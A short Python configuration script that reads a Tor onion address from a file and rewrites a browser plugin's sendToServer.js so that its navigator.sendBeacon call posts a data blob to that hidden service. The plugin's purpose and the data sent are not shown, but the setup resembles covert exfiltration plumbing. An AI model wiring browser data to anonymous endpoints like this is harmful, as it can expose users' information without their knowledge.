#!/usr/bin/env python3
import os
import subprocess
import sys

# Resolve base directory dynamically (where this script lives)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PLUGIN_DIR = os.path.join(BASE_DIR, "..", "plugin")
ONION_FILE = os.path.join(BASE_DIR, "onion_address.txt")
SENDTO_FILE = os.path.join(PLUGIN_DIR, "js", "sendToServer.js")

# 1. Read the onion address
if not os.path.exists(ONION_FILE):
    print(f"[ERROR] Onion address file not found: {ONION_FILE}")
    sys.exit(1)

with open(ONION_FILE, "r") as f:
    onion_address = f.read().strip()

if not onion_address:
    print("[ERROR] Onion address file is empty!")
    sys.exit(1)

print(f"[INFO] Using onion address: {onion_address}")


# 2. Update sendToServer.js
if not os.path.exists(SENDTO_FILE):
    print(f"[ERROR] sendToServer.js not found at {SENDTO_FILE}")
    sys.exit(1)

print(f"[INFO] Updating sendToServer.js with new onion address...")
with open(SENDTO_FILE, "r") as f:
    lines = f.readlines()

with open(SENDTO_FILE, "w") as f:
    for line in lines:
        if "navigator.sendBeacon(" in line:
            f.write(f'      navigator.sendBeacon("http://{onion_address}:80", blob);\n')
        else:
            f.write(line)

print("[SUCCESS] sendToServer.js updated successfully.")


